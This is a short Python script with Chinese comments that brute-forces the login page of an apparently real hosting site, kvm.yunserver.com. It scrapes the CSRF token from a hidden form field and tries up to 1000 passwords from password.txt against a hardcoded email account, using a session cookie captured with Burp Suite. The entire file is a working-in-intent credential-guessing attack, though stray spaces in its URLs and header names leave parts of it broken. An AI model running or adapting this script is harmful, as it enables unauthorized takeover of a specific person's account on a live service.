from bs4 import BeautifulSoup
import requests
'''
header可以从burpsuite截取，根据截取到的相应信息按如下方式填写即可。
'''
header={
        'GET': 'https: // kvm.yunserver.com/dologin.php HTTP/1.1',
        'Host': 'kvm.yunserver.com',
        'User - Agent': 'Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv: 78.0) Gecko / 20100101 Firefox / 78.0',
        'Accept': 'text / html, application / xhtml + xml, application / xml;q = 0.9, image / webp, * / *;q = 0.8',
        'Accept - Language': 'zh - CN, zh;q = 0.8, zh - TW;q = 0.7, zh - HK;q = 0.5, en - US;q = 0.3, en;q = 0.2',
        'Accept - Encoding': 'gzip, deflate, br',
        'Content - Type': 'application / x - www - form - urlencoded',
        'Content - Length': '90',
        'Origin': 'https: // kvm.yunserver.com',
        'Connection': 'keep - alive',
        'Referer': 'https: // kvm.yunserver.com / clientarea.php',
        'Cookie': 'WHMCSveZQfV0ztYPc = q12jqji7cplnn7kdca4jo0ss31',
        'Upgrade - Insecure - Requests': '1'
        }
requrl="https://kvm.yunserver.com/dologin.php" #我们需要的访问的链接

def get_token(requrl,header):   #定义一个函数获取user_taken并打印状态码（status code硬翻）和当前请求所返回内容的长度
    response=requests.get(url=requrl,headers=header)    #将当前请求的响应内容存储在reponse变量中
    print (response.status_code,len(response.content))  #输出状态码（status code）和响应内容长度
    soup=BeautifulSoup(response.text,"html.parser")
   # print(response.text)   #用来显示返回内容
    '''
     response.text将响应信息转化成HTML字符串并作为第一个参数传给BeautifulSoup对象soup，
    第二个参数传入的是解析器类型，这里我使用html.parser
    '''
    input=soup.form.select("input[type='hidden']")   #表示在form标签里面寻找type为hidden的input标签，返回的是一个list列表
    user_token=input[0]['value']                   #获取获取input标签里的第一个value即用户的token
    return user_token

user_token=get_token(requrl,header) #获得第一个user_token
i=0
for line in open("password.txt"):   #逐行读取文件，对字典文件password.txt进行一个一个的试错，这个字典文件有1000个密码，循环一千次
    requrl="https: // kvm.yunserver.com/dologin.php/?token="+user_token+"&username=924989973%40qq.com&password="+line.strip()
    #每一行密码后面都有一个换行符所以需要strip函数（默认为空格或换行符）将换行符去掉
    i=i+1
    print (i , 'admin' ,line.strip(),end="  ")
    user_token=get_token(requrl,header) #获取下一个密码对应的user_token,并输出当前请求的响应情况和响应内容长度

    # 尝试次数
    if(i==1000):
        break